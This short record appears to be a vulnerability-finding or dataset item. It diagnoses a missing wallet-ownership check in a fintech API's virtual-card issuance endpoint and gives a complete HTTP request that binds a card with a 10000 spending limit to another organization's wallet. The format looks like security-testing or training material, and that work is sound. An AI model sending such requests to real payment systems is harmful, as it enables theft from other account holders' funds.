diagnosis: The fintech card issuance controller verifies that the Sanctum token possesses the 'cards:create' scope but loads the funding Wallet model directly from the request parameter without checking that the wallet belongs to the token owner. An attacker can bind newly issued corporate virtual cards to another organization's funded wallet.
exploit_request:
POST /api/fintech/virtual-cards HTTP/1.1
Host: api.fintech-wallets.io
Authorization: Bearer 40|tokenwithcardscreate
Content-Type: application/json

{"wallet_id": 2094, "spending_limit": 10000.00}
